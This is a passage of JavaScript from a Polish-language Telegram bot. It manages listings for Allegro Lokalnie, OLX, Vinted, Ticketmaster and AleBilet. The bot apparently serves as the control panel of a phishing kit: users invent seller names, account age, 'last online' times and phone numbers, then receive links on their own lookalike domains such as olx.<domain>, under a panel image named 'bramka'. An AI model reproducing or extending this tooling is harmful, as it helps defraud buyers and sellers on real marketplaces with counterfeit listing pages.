					if (msg.chat.id !== chatId) return;
					bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

					if (["stop", "cancel"].includes((msg.text || "").toLowerCase())) {
						sendTempMessage(chatId, "❌ Edycja anulowana.");
						bot.removeListener("message", listener);
						return;
					}

					const offer = offers.find(o => o.idoferty === offerId);
					if (!offer) {
						sendTempMessage(chatId, "⚠️ Oferta nie została znaleziona.");
						bot.removeListener("message", listener);
						return;
					}

					if (field === "nazwa") {
						const newLink = await generateUniqueOfferLink(OfferVinted, msg.text.replace(/\s+/g, '-'));
						await editOfferDBVinted(offerId, { nazwa: msg.text, link: newLink });
						sendTempMessage(chatId, "✅ Nazwa i link zostały zaktualizowane!");
					} else if (field === "oplata") {
						const raw = (msg.text || "").trim().toLowerCase();
						if (["auto", "reset", "0", "-", "brak"].includes(raw)) {
							await editOfferDBVinted(offerId, { oplata: "" });
							sendTempMessage(chatId, "✅ Opłata serwisowa: automatyczna.");
						} else {
							const val = parseFloat(raw.replace(",", "."));
							if (!Number.isFinite(val) || val < 0) {
								sendTempMessage(chatId, "❌ Podaj kwotę opłaty (np. 25) albo wpisz auto.");
							} else {
								await editOfferDBVinted(offerId, { oplata: String(val) });
								sendTempMessage(chatId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Opłata serwisowa: ${val.toFixed(2)} zł.`);
							}
						}
					} else {
						await editOfferDBVinted(offerId, {
							[field]: field === "cena" ? parseFloat(msg.text) : msg.text
						});
						sendTempMessage(chatId, "✅ Oferta została zaktualizowana!");
					}

					setTimeout(() => refreshOfferMenuVintedGlobal(chatId, query.message.message_id, offerId, query.from.id), 250);
					bot.removeListener("message", listener);
				};
				bot.on("message", listener);
			}).catch(() => {});
		}).catch(error => console.error("Błąd editOfferFieldVinted:", error));
	};

	if (query.data.startsWith("tm_edit_name_")) editOfferFieldTicketmaster(query, "nazwa", "✏️ Podaj nazwę wydarzenia:");
	if (query.data.startsWith("tm_edit_desc_")) editOfferFieldTicketmaster(query, "description", "📝 Podaj opis / arenę:");
	if (query.data.startsWith("tm_edit_price_")) editOfferFieldTicketmaster(query, "cena", "💰 Podaj cenę biletu (za sztukę):");
	if (query.data.startsWith("tm_edit_fee_")) editOfferFieldTicketmaster(query, "oplata", "🧾 Podaj kwotę opłaty serwisowej (albo wpisz auto = 15%):");
	if (query.data.startsWith("tm_edit_city_")) editOfferFieldTicketmaster(query, "miasto", "🏙 Podaj miejsce wydarzenia:");
	if (query.data.startsWith("tm_edit_date_")) editOfferFieldTicketmaster(query, "lastonline", "📅 Podaj datę wydarzenia:");
	if (query.data.startsWith("tm_edit_seats_")) editOfferFieldTicketmaster(query, "tagi", "🪑 Podaj sekcję;rząd;miejsca (np. T-301;44;1-2):");

	if (query.data.startsWith("vinted_edit_seats_")) editOfferFieldVinted(query, "tagi", "🪑 Podaj rozmiar;stan (np. L;Bardzo dobry):");

	const editOfferFieldAlebilet = (query, field, prompt) => {
		const offerId = query.data.split("_").slice(3).join("_");
		const chatId = query.message.chat.id;

		loadOffersAlebiletDB().then(async () => {
			const offers = await loadOffersAlebiletDB();
			bot.sendMessage(chatId, markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *EDYCJA OFERTY*\n──────────────────\n\n› ${prompt}\n\n› Aby anulować wpisz \`stop\`.`), { parse_mode: "HTML" }).then(sentMessage => {
				const listener = async (msg) => {
					if (msg.chat.id !== chatId) return;
					bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});

					if (["stop", "cancel"].includes((msg.text || "").toLowerCase())) {
						sendTempMessage(chatId, "❌ Edycja anulowana.");
						bot.removeListener("message", listener);
						return;
					}

					const offer = offers.find(o => o.idoferty === offerId);
					if (!offer) {
						sendTempMessage(chatId, "⚠️ Oferta nie została znaleziona.");
						bot.removeListener("message", listener);
						return;
					}

					if (field === "nazwa") {
						sendTempMessage(chatId, "✅ Nazwa została zaktualizowana!");
						await editOfferDBAlebilet(offerId, { nazwa: msg.text });
					} else if (field === "oplata") {
						const raw = (msg.text || "").trim().toLowerCase();
						if (["auto", "reset", "0", "-", "brak"].includes(raw)) {
							await editOfferDBAlebilet(offerId, { oplata: "" });
							sendTempMessage(chatId, "✅ Opłata serwisowa: automatyczna (15%).");
						} else {
							const val = parseFloat(raw.replace(",", "."));
							if (!Number.isFinite(val) || val < 0) {
								sendTempMessage(chatId, "❌ Podaj kwotę opłaty (np. 25) albo wpisz auto.");
							} else {
								await editOfferDBAlebilet(offerId, { oplata: String(val) });
								sendTempMessage(chatId, `<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Opłata serwisowa: ${val.toFixed(2)} zł.`);
							}
						}
					} else {
						await editOfferDBAlebilet(offerId, {
							[field]: field === "cena" ? parseFloat(msg.text) : msg.text
						});
						sendTempMessage(chatId, "✅ Oferta została zaktualizowana!");
					}

					setTimeout(() => refreshOfferMenuAlebiletGlobal(chatId, query.message.message_id, offerId, query.from.id), 250);
					bot.removeListener("message", listener);
				};
				bot.on("message", listener);
			}).catch(() => {});
		}).catch(error => console.error("Błąd editOfferFieldAlebilet:", error));
	};

	if (query.data.startsWith("ab_edit_name_")) editOfferFieldAlebilet(query, "nazwa", "✏️ Podaj nazwę imprezy:");
	if (query.data.startsWith("ab_edit_city_")) editOfferFieldAlebilet(query, "miasto", "🏙 Podaj miejsce wydarzenia:");
	if (query.data.startsWith("ab_edit_date_")) editOfferFieldAlebilet(query, "lastonline", "📅 Podaj termin imprezy:");
	if (query.data.startsWith("ab_edit_seats_")) editOfferFieldAlebilet(query, "tagi", "🪑 Podaj typ;sektor;rząd (np. Trybuny;B12;6):");
	if (query.data.startsWith("ab_edit_price_")) editOfferFieldAlebilet(query, "cena", "💰 Podaj cenę za bilet (za sztukę):");
	if (query.data.startsWith("ab_edit_fee_")) editOfferFieldAlebilet(query, "oplata", "🧾 Podaj kwotę opłaty serwisowej (albo wpisz auto = 15%):");
	if (query.data.startsWith("ab_edit_qty_")) editOfferFieldAlebilet(query, "ilosc", "🔢 Podaj ilość biletów:");

	if (query.data.startsWith("vinted_edit_name_")) editOfferFieldVinted(query, "nazwa", "✏️ Podaj nazwę produktu:");
	if (query.data.startsWith("vinted_edit_desc_")) editOfferFieldVinted(query, "description", "📝 Podaj opis:");
	if (query.data.startsWith("vinted_edit_price_")) editOfferFieldVinted(query, "cena", "💵 Podaj cenę przedmiotu:");
	if (query.data.startsWith("vinted_edit_delivery_")) editOfferFieldVinted(query, "cenaDostawy", "💸 Podaj cenę dostawy:");
	if (query.data.startsWith("vinted_edit_protection_")) editOfferFieldVinted(query, "cenaOchrony", "🛡️ Podaj cenę ochrony:");
	if (query.data.startsWith("vinted_edit_company_")) editOfferFieldVinted(query, "nazwaFirmy", "💼 Podaj nazwę firmy:");
	if (query.data.startsWith("vinted_edit_seller_")) editOfferFieldVinted(query, "sprzedawca", "👤 Podaj nick sprzedawcy:");
	if (query.data.startsWith("vinted_edit_city_")) editOfferFieldVinted(query, "miasto", "📍 Podaj miasto:");
	if (query.data.startsWith("vinted_edit_lastonline_")) editOfferFieldVinted(query, "lastonline", "✅ Podaj ostatnio online:");
	if (query.data.startsWith("vinted_edit_category_")) editOfferFieldVinted(query, "kategoria", "🛍️ Podaj kategorię:");
	if (query.data.startsWith("vinted_edit_brand_")) editOfferFieldVinted(query, "kategoria", "🛍️ Podaj kategorię:");
	if (query.data.startsWith("vinted_edit_tags_")) editOfferFieldVinted(query, "tagi", "🏷️ Podaj tagi (np. Stan: Bardzo dobry;Marka: Nike;Rozmiar: L):");
	if (query.data.startsWith("vinted_edit_wiek_")) editOfferFieldVinted(query, "wiek", "👵 Podaj wiek konta:");






	if (query.data.startsWith("edit_name_")) editOfferField(query, "nazwa", "✏️ Podaj nową nazwę oferty:");
	if (query.data.startsWith("edit_desc_")) editOfferField(query, "description", "📝 Podaj nowy opis oferty:");
	if (query.data.startsWith("edit_price_")) editOfferField(query, "cena", "💰 Podaj nową cenę oferty:");
	if (query.data.startsWith("edit_seller_")) editOfferField(query, "sprzedawca", "👤 Podaj nową nazwę sprzedawcy:");
	if (query.data.startsWith("edit_city_")) editOfferField(query, "miasto", "🏙 Podaj nowe miasto:");
	if (query.data.startsWith("edit_region_")) editOfferField(query, "wojewodztwo", "🏷️ Podaj nowe województwo:");
	if (query.data.startsWith("edit_category_")) editOfferField(query, "kategoria", "🏷 Podaj nową kategorię:");
	if (query.data.startsWith("edit_tags_")) editOfferField(query, "tagi", "🏷 Podaj nowe tagi:");
	if (query.data.startsWith("edit_wiek_")) editOfferField(query, "wiek", "👵 Podaj wiek konta: (NP: 10)");
	if (query.data.startsWith("edit_rodzaj_")) editOfferField(query, "rodzaj", "❓ Podaj rodzaj konta: (OSOBA PRYWATNA | FIRMA )");
	if (query.data.startsWith("edit_lastonline_")) editOfferField(query, "lastonline", "❓ Podaj ostatnie logowanie (Dzisiaj o 16:20)");
	if (query.data.startsWith("edit_numer_")) editOfferField(query, "numer", "☎️ Podaj numer telefonu (Aby schowac wpisz Brak)");


	if (query.data === "my_offers") {
		const caption = "🏪 <b>Wybierz sklep.</b>"

		const options = {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[{
						text: "Allegro Lokalnie", icon_custom_emoji_id: "5920332557466997677", callback_data: `my_offers_lokalnie`
					}, {
						text: "OLX", icon_custom_emoji_id: "5920332557466997677", callback_data: `my_offers_olx`
					}],
					[{
						text: "👗 Vinted",
						callback_data: `my_offers_vinted`
					}, {
						text: "🎫 Ticketmaster",
						callback_data: `my_offers_ticketmaster`
					}],
					[{
						text: "🎟 AleBilet",
						callback_data: `my_offers_alebilet`
					}],
					[{
						text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: `back_to_main`
					}]
				]
			}
		};
		bot.editMessageCaption(caption, {
			chat_id: chatId,
			message_id: messageId,
			...options
		}).catch((err) => console.error("Błąd edycji wiadomości:", err));
	}

	if (query.data === "my_offers_lokalnie") {
		loadOffersDB().then(offers => {
			const userOffers = offers.filter(o => o.owner.toString() === userId.toString());

			if (userOffers.length === 0) {
				bot.answerCallbackQuery(query.id, {
					text: "❌ Nie masz żadnych ofert!"
				});
				return;
			}

			bot.answerCallbackQuery(query.id);

			let caption = `<tg-emoji emoji-id=\"6034969813032374911\">📋</tg-emoji> <b>Allegro Lokalnie</b>`;

			const buttons = userOffers.map(offer => [{
				text: `${offer.nazwa}`,
				callback_data: `edit_offer_${offer.idoferty}`
			}]);
			buttons.push([{
					text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "gateway_platform_allegrolokalnie"
				},
				{
					text: "Usuń wszystkie oferty", icon_custom_emoji_id: "6039522349517115015", callback_data: "delete_all"
				}
			]);

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: buttons
				}
			};

			bot.editMessageMedia({
				type: "photo",
				media: "attach://bramka.png",
				caption: caption
			}, {
				chat_id: chatId,
				message_id: messageId,
				...options
			});
		});
	}

	if (query.data === "my_offers_olx") {
		loadOffersOLXDB().then(offers => {
			const userOffers = offers.filter(o => o.owner.toString() === userId.toString());

			if (userOffers.length === 0) {
				bot.answerCallbackQuery(query.id, {
					text: "❌ Nie masz żadnych ofert!"
				});
				return;
			}

			bot.answerCallbackQuery(query.id);

			let caption = `<tg-emoji emoji-id=\"6034969813032374911\">📃</tg-emoji> OLX`;

			const buttons = userOffers.map(offer => [{
				text: `${offer.nazwa}`,
				callback_data: `olx_edit_offer_${offer.idoferty}`
			}]);
			buttons.push([{
					text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "gateway_platform_olx"
				},
				{
					text: "Usuń wszystkie oferty", icon_custom_emoji_id: "6039522349517115015", callback_data: "delete_all_olx"
				}
			]);

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: buttons
				}
			};

			bot.editMessageMedia({
				type: "photo",
				media: "attach://bramka.png",
				caption: caption
			}, {
				chat_id: chatId,
				message_id: messageId,
				...options
			});
		});
	}

	if (query.data.startsWith("olx_edit_offer_")) {
		loadOffersOLXDB().then(async offers => {
			const offerId = query.data.split("_")[3];
			const offer = offers.find(o => o.idoferty === offerId);
			const users = await loadUsersDB();
			const user = users.find(u => u.id === query.from.id);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerLink = domain ? `https://olx.${domain}/oferta/${encodeURIComponent(offer.link)}` : "NIE MASZ PODPIETEJ DOMENY";

			if (!offer) {
				bot.answerCallbackQuery(query.id, {
					text: "❌ Oferta nie istnieje!"
				});
				return;
			}
			let tagi = offer.tagi.length > 128 ? 'Tagi są zbyt długie, nie da się wyświetlić.' : `\`${offer.tagi}\``;

			let description = offer.description.length > 256 ? 'Opis jest za długi, nie da się wyświetlić.' : `\`${offer.description}\``;
			let caption = `───────── [ 𝕂 ] ─────────\n❖ *OFERTA · OLX*\n──────────────────\n\n` +
				`› *Nazwa:* <code>${offer.nazwa}</code>\n` +
				`› *Opis:* ${description}\n` +
				`› *Cena:* <code>${offer.cena} zł</code>\n` +
				`› *Sprzedawca:* <code>${offer.sprzedawca}</code>\n` +
				`› *Miasto:* <code>${offer.miasto}</code>, <code>${offer.wojewodztwo}</code>\n` +
				`› *Kategoria:* <code>${offer.kategoria}</code>\n` +
				`› *Tagi:* <code>${tagi}</code>\n` +
				`› *Wiek:* <code>${offer.wiek}</code>\n` +
				`› *Ostatnio online:* <code>${offer.lastonline}</code>\n` +
				`› *Numer telefonu:* <code>${offer.numer}</code>\n` +
				`› *Zdjęcia:* ${offer.zdjecia.length}\n\n` +
				`› *Link:* ${offerLink}`;
			caption = fitCaption(caption);

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{
								text: "Edytuj nazwę", icon_custom_emoji_id: "6039779802741739617", callback_data: `olx_edit_name_${offer.idoferty}`
							},
							{
								text: "Edytuj opis", icon_custom_emoji_id: "5920046907782074235", callback_data: `olx_edit_desc_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj cenę", icon_custom_emoji_id: "5778421276024509124", callback_data: `olx_edit_price_${offer.idoferty}`
							},
							{
								text: "Edytuj sprzedawcę", icon_custom_emoji_id: "6032994772321309200", callback_data: `olx_edit_seller_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj miasto", icon_custom_emoji_id: "6030399199030284183", callback_data: `olx_edit_city_${offer.idoferty}`
							},
							{
								text: "Edytuj województwo", icon_custom_emoji_id: "5888620056551625531", callback_data: `olx_edit_region_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj kategorię", icon_custom_emoji_id: "5888620056551625531", callback_data: `olx_edit_category_${offer.idoferty}`
							},
							{
								text: "Edytuj Tagi", icon_custom_emoji_id: "5888620056551625531", callback_data: `olx_edit_tags_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj wiek konta", icon_custom_emoji_id: "5890937706803894250",
								callback_data: `olx_edit_wiek_${offer.idoferty}`
							},
							{
								text: "Ostatnio online", icon_custom_emoji_id: "6030848053177486888", callback_data: `olx_edit_lastonline_${offer.idoferty}`
							},
							{
								text: "Edytuj numer telefonu", icon_custom_emoji_id: "6039398100408209720", callback_data: `olx_edit_numer_${offer.idoferty}`
							}
						],
						[{
								text: "Dodaj zdjęcia", icon_custom_emoji_id: "6030506650522096180", callback_data: `olx_edit_addphotos_${offer.idoferty}`
							},
							{
								text: "Usuń zdjęcia", icon_custom_emoji_id: "6039522349517115015", callback_data: `olx_edit_removephotos_${offer.idoferty}`
							}
						],

						[{
							text: "Załaduj z Allegro", icon_custom_emoji_id: "6041730074376410123", callback_data: `olxloadallegro_${offer.idoferty}`
						}],
						[{
							text: "Kod QR", icon_custom_emoji_id: "6039605143601680423", callback_data: `offer_qr_olx_${offer.idoferty}`
						}],
						[{
							text: "Usuń ofertę", icon_custom_emoji_id: "6030757850274336631", callback_data: `olxdelete_offer_${offer.idoferty}`
						}],
						[{
							text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers"
						}]
					]
				}
			};

			bot.editMessageMedia({
				type: "photo",
				media: "attach://bramka.png",
				caption: caption
			}, {
				parse_mode: "HTML",
				chat_id: chatId,
				message_id: messageId,
				...options
			});
		}).catch(error => {
			console.error("Błąd podczas ładowania ofert:", error);
			bot.answerCallbackQuery(query.id, {
				text: "❌ Wystąpił błąd podczas ładowania ofert."
			});
		});
	}


	if (query.data.startsWith("edit_offer_")) {
		loadOffersDB().then(async offers => {
			const offerId = query.data.split("_")[2];
			const offer = offers.find(o => o.idoferty === offerId);
			const users = await loadUsersDB();
			const user = users.find(u => u.id === query.from.id);
			const domain = getEffectiveUserDomainSync(user, publicDomain);
			const offerLink = domain ? `https://allegrolokalnie.${domain}/oferta/${encodeURIComponent(offer.link)}` : "NIE MASZ PODPIETEJ DOMENY";

			if (!offer) {
				bot.answerCallbackQuery(query.id, {
					text: "❌ Oferta nie istnieje!"
				});
				return;
			}
			let tagi = offer.tagi.length > 128 ? 'Tagi są zbyt długie, nie da się wyświetlić.' : `\`${offer.tagi}\``;

			let description = offer.description.length > 256 ? 'Opis jest za długi, nie da się wyświetlić.' : `\`${offer.description}\``;
			let caption = `───────── [ 𝕂 ] ─────────\n❖ *OFERTA · ALLEGRO LOKALNIE*\n──────────────────\n\n` +
				`› *Nazwa:* <code>${offer.nazwa}</code>\n` +
				`› *Opis:* ${description}\n` +
				`› *Cena:* <code>${offer.cena} zł</code>\n` +
				`› *Sprzedawca:* <code>${offer.sprzedawca}</code>\n` +
				`› *Miasto:* <code>${offer.miasto}</code>, <code>${offer.wojewodztwo}</code>\n` +
				`› *Kategoria:* <code>${offer.kategoria}</code>\n` +
				`› *Tagi:* <code>${tagi}</code>\n` +
				`› *Wiek:* <code>${offer.wiek}</code>\n` +
				`› *Ostatnie online:* <code>${offer.lastonline}</code>\n` +
				`› *Numer telefonu:* <code>${offer.numer}</code>\n` +
				`› *Rodzaj:* <code>${offer.rodzaj}</code>\n` +
				`› *Zdjęcia:* ${offer.zdjecia.length}\n\n` +
				`› *Link:* ${offerLink}`;
			caption = fitCaption(caption);

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
						[{
								text: "Edytuj nazwę", icon_custom_emoji_id: "6039779802741739617", callback_data: `edit_name_${offer.idoferty}`
							},
							{
								text: "Edytuj opis", icon_custom_emoji_id: "5920046907782074235", callback_data: `edit_desc_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj cenę", icon_custom_emoji_id: "5778421276024509124", callback_data: `edit_price_${offer.idoferty}`
							},
							{
								text: "Edytuj sprzedawcę", icon_custom_emoji_id: "6032994772321309200", callback_data: `edit_seller_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj miasto", icon_custom_emoji_id: "6030399199030284183", callback_data: `edit_city_${offer.idoferty}`
							},
							{
								text: "Edytuj województwo", icon_custom_emoji_id: "5888620056551625531", callback_data: `edit_region_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj kategorię", icon_custom_emoji_id: "5888620056551625531", callback_data: `edit_category_${offer.idoferty}`
							},
							{
								text: "Edytuj Tagi", icon_custom_emoji_id: "5888620056551625531", callback_data: `edit_tags_${offer.idoferty}`
							}
						],
						[{
								text: "Edytuj wiek konta", icon_custom_emoji_id: "5890937706803894250",
								callback_data: `edit_wiek_${offer.idoferty}`
							},
							{
								text: "Edytuj rodzaj konta", icon_custom_emoji_id: "6030848053177486888", callback_data: `edit_rodzaj_${offer.idoferty}`
							},
						],
						[
							{
                                text: "Ostatnio online", icon_custom_emoji_id: "5775896410780079073", callback_data: `edit_lastonline_${offer.idoferty}`
							},
							{
                                text: "Numer telefonu", icon_custom_emoji_id: "6039398100408209720", callback_data: `edit_numer_${offer.idoferty}`
							},
						],
						[{
								text: "Dodaj zdjęcia", icon_custom_emoji_id: "6030506650522096180", callback_data: `edit_addphotos_${offer.idoferty}`
							},
							{
								text: "Usuń zdjęcia", icon_custom_emoji_id: "6039522349517115015", callback_data: `edit_removephotos_${offer.idoferty}`
							}
						],
						[{
							text: "Załaduj z OLX", icon_custom_emoji_id: "6041730074376410123", callback_data: `loadolx_${offer.idoferty}`
						}],
						[{
							text: "Załaduj z Allegro", icon_custom_emoji_id: "6041730074376410123", callback_data: `loadallegro_${offer.idoferty}`
						}],
						[{
							text: "Kod QR", icon_custom_emoji_id: "6039605143601680423", callback_data: `offer_qr_lokalnie_${offer.idoferty}`
						}],
						[{
							text: "Usuń ofertę", icon_custom_emoji_id: "6030757850274336631", callback_data: `delete_offer_${offer.idoferty}`
						}],
						[{
							text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "my_offers"
						}]
					]
				}
			};

			bot.editMessageMedia({
				type: "photo",
				media: "attach://bramka.png",
				caption: caption
			}, {
				parse_mode: "HTML",
				chat_id: chatId,
				message_id: messageId,
				...options
			});
		}).catch(error => {
			console.error("Błąd podczas ładowania ofert:", error);
			bot.answerCallbackQuery(query.id, {
				text: "❌ Wystąpił błąd podczas ładowania ofert."
			});
		});
	}

	function showUserOffers(chatId, messageId, userId) {
		loadOffersDB().then(offers => {
			const userOffers = offers.filter(o => o.owner === userId);

			if (userOffers.length === 0) {
				bot.answerCallbackQuery(query.id, {
					text: "❌ Nie masz żadnych ofert!"
				});
				return;
			}

			bot.answerCallbackQuery(query.id);

			let caption = `<tg-emoji emoji-id=\"6034969813032374911\">📋</tg-emoji> <b>Twoje oferty</b>`;

			const buttons = userOffers.map(offer => [{
				text: `${offer.nazwa}`,
				callback_data: `edit_offer_${offer.id}`
			}]);
			buttons.push([{
					text: "Cofnij", icon_custom_emoji_id: "5895507195524550741", callback_data: "back_to_main"
				},
				{
					text: "Usuń wszystkie oferty", icon_custom_emoji_id: "6039522349517115015", callback_data: "delete_all"
				}
			]);

			const options = {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: buttons
				}
			};

			bot.editMessageMedia({
				type: "photo",
				media: "attach://bramka.png",
				caption: caption
			}, {
				chat_id: chatId,
				message_id: messageId,
				...options
			});
		});
	}


	if (query.data.startsWith("edit_addphotos_")) {
		const offerId = query.data.split("_")[2];
		const chatId = query.message.chat.id;

		loadOffersDB()
			.then(async (offers) => {
				const offer = offers.find(o => o.idoferty.toString() === offerId.toString());

				if (!offer) {
					bot.answerCallbackQuery(query.id, {
						text: "❌ Oferta nie istnieje!"
					});
					return;
				}

				bot.sendMessage(chatId, "📷 Wyślij zdjęcie, które chcesz dodać do oferty.", {
					reply_markup: {
						force_reply: true
					}
				}).then(sentMessage => {
					bot.once("photo", async (msg) => {
						if (msg.reply_to_message && msg.reply_to_message.message_id === sentMessage.message_id) {
							if (!msg.photo || msg.photo.length === 0) {
								bot.sendMessage(chatId, "❌ Nie wysłano zdjęcia. Spróbuj ponownie.");
								return;
							}

							const fileId = msg.photo[msg.photo.length - 1].file_id;
							const fileUrl = await bot.getFileLink(fileId);
							const imageIndex = offer.zdjecia.length + 1;
							const fileName = `${offerId}.${imageIndex}.jpeg`;
							const filePath = path.join(__dirname, "images", fileName);

							try {
								const response = await axios({
									url: fileUrl,
									responseType: "stream",
								});

								response.data.pipe(fs.createWriteStream(filePath));

								offer.zdjecia.push(`${offerId}.${imageIndex}`);
								await editOfferDB(offerId, {
									zdjecia: offer.zdjecia
								});

								bot.deleteMessage(chatId, sentMessage.message_id);

								refreshOfferMenu(chatId, messageId, offerId);
							} catch (error) {
								console.error("Błąd pobierania zdjęcia:", error);
								sendTempMessage(chatId, "❌ Wystąpił błąd podczas zapisywania zdjęcia.");
							}
						}
					});
				});
			})
			.catch(error => {
				console.error("Błąd podczas dodawania zdjęcia:", error);
				sendTempMessage(chatId, "❌ Wystąpił błąd podczas dodawania zdjęcia.");
			});
	}
	if (query.data.startsWith("olx_edit_addphotos_")) {
		const offerId = query.data.split("_")[3];
		const chatId = query.message.chat.id;

		loadOffersOLXDB()
			.then(async (offers) => {
				const offer = offers.find(o => o.idoferty.toString() === offerId.toString());

				if (!offer) {
					bot.answerCallbackQuery(query.id, {
						text: "❌ Oferta nie istnieje!"
					});
					return;
				}

				bot.sendMessage(chatId, "📷 Wyślij zdjęcie, które chcesz dodać do oferty.", {
					reply_markup: {
						force_reply: true
					}
				}).then(sentMessage => {
					bot.once("photo", async (msg) => {
						if (msg.reply_to_message && msg.reply_to_message.message_id === sentMessage.message_id) {
							if (!msg.photo || msg.photo.length === 0) {
								bot.sendMessage(chatId, "❌ Nie wysłano zdjęcia. Spróbuj ponownie.");
								return;
							}

							const fileId = msg.photo[msg.photo.length - 1].file_id;
							const fileUrl = await bot.getFileLink(fileId);
							const imageIndex = offer.zdjecia.length + 1;
							const fileName = `${offerId}.${imageIndex}.jpeg`;
							const filePath = path.join(__dirname, "images", fileName);

							try {
								const response = await axios({
									url: fileUrl,
									responseType: "stream",
								});

								response.data.pipe(fs.createWriteStream(filePath));

								offer.zdjecia.push(`${offerId}.${imageIndex}`);
								await editOfferDBOLX(offerId, {
									zdjecia: offer.zdjecia
								});

								bot.deleteMessage(chatId, sentMessage.message_id);

								refreshOfferMenuOLX(chatId, messageId, offerId);
							} catch (error) {
								console.error("Błąd pobierania zdjęcia:", error);
								sendTempMessage(chatId, "❌ Wystąpił błąd podczas zapisywania zdjęcia.");
							}
						}
					});
				});
			})
			.catch(error => {
				console.error("Błąd podczas dodawania zdjęcia:", error);
				sendTempMessage(chatId, "❌ Wystąpił błąd podczas dodawania zdjęcia.");
			});
	}

	if (query.data.startsWith("tm_edit_addphotos_")) {
		const offerId = query.data.replace("tm_edit_addphotos_", "");
		loadOffersTicketmasterDB().then(async (offers) => {
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) {
				bot.answerCallbackQuery(query.id, { text: "❌ Oferta nie istnieje!" });
				return;
			}
			bot.sendMessage(chatId, "📷 Wyślij zdjęcie wydarzenia.", { reply_markup: { force_reply: true } }).then(sentMessage => {
				bot.once("photo", async (msg) => {
					if (!msg.reply_to_message || msg.reply_to_message.message_id !== sentMessage.message_id) return;
					if (!msg.photo?.length) return;
					const fileId = msg.photo[msg.photo.length - 1].file_id;
					const fileUrl = await bot.getFileLink(fileId);
					const photoKey = offer.zdjecia.length === 0 ? `${offerId}_event` : `${offerId}.${offer.zdjecia.length + 1}`;
					const filePath = path.join(__dirname, "images", `${photoKey}.jpeg`);
					try {
						const response = await axios({ url: fileUrl, responseType: "stream" });
						response.data.pipe(fs.createWriteStream(filePath));
						offer.zdjecia.push(photoKey);
						await editOfferDBTicketmaster(offerId, { zdjecia: offer.zdjecia });
						bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});
						refreshOfferMenuTicketmasterGlobal(chatId, messageId, offerId, query.from.id);
					} catch (error) {
						console.error("Błąd zdjęcia Ticketmaster:", error);
						sendTempMessage(chatId, "❌ Błąd zapisywania zdjęcia.");
					}
				});
			});
		});
	}

	if (query.data.startsWith("vinted_edit_addphotos_")) {
		const offerId = query.data.replace("vinted_edit_addphotos_", "");
		loadOffersVintedDB().then(async (offers) => {
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer) {
				bot.answerCallbackQuery(query.id, { text: "❌ Oferta nie istnieje!" });
				return;
			}
			bot.sendMessage(chatId, "📷 Wyślij zdjęcie produktu.", { reply_markup: { force_reply: true } }).then(sentMessage => {
				bot.once("photo", async (msg) => {
					if (!msg.reply_to_message || msg.reply_to_message.message_id !== sentMessage.message_id) return;
					if (!msg.photo?.length) return;
					const fileId = msg.photo[msg.photo.length - 1].file_id;
					const fileUrl = await bot.getFileLink(fileId);
					const imageIndex = offer.zdjecia.length + 1;
					const photoKey = `${offerId}.${imageIndex}`;
					const filePath = path.join(__dirname, "images", `${photoKey}.jpeg`);
					try {
						const response = await axios({ url: fileUrl, responseType: "stream" });
						response.data.pipe(fs.createWriteStream(filePath));
						offer.zdjecia.push(photoKey);
						await editOfferDBVinted(offerId, { zdjecia: offer.zdjecia });
						bot.deleteMessage(chatId, sentMessage.message_id).catch(() => {});
						refreshOfferMenuVintedGlobal(chatId, messageId, offerId, query.from.id);
					} catch (error) {
						console.error("Błąd zdjęcia Vinted:", error);
						sendTempMessage(chatId, "❌ Błąd zapisywania zdjęcia.");
					}
				});
			});
		});
	}

	if (query.data.startsWith("tm_edit_removephotos_")) {
		const offerId = query.data.replace("tm_edit_removephotos_", "");
		loadOffersTicketmasterDB().then(async (offers) => {
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer?.zdjecia?.length) {
				bot.answerCallbackQuery(query.id, { text: "❌ Brak zdjęć!" });
				return;
			}
			offer.zdjecia = [];
			await editOfferDBTicketmaster(offerId, { zdjecia: [] });
			refreshOfferMenuTicketmasterGlobal(chatId, messageId, offerId, query.from.id);
		});
	}

	if (query.data.startsWith("vinted_edit_removephotos_")) {
		const offerId = query.data.replace("vinted_edit_removephotos_", "");
		loadOffersVintedDB().then(async (offers) => {
			const offer = offers.find(o => o.idoferty.toString() === offerId.toString());
			if (!offer?.zdjecia?.length) {
				bot.answerCallbackQuery(query.id, { text: "❌ Brak zdjęć!" });
				return;
			}
			offer.zdjecia = [];
			await editOfferDBVinted(offerId, { zdjecia: [] });
			refreshOfferMenuVintedGlobal(chatId, messageId, offerId, query.from.id);
		});
	}

	if (query.data.startsWith("ab_delete_offer_")) {
		const offerId = query.data.replace("ab_delete_offer_", "");
		try {
			await deleteOfferDBAlebilet(offerId);
			bot.answerCallbackQuery(query.id, { text: "✅ Oferta AleBilet usunięta!" });
			const offers = await loadOffersAlebiletDB();
			const userOffers = offers.filter(o => o.owner.toString() === userId.toString());
			if (userOffers.length === 0) {
				showMainMenu(chatId, userId, messageId);
			} else {
				bot.editMessageMedia({
					type: "photo",
					media: "attach://bramka.png",
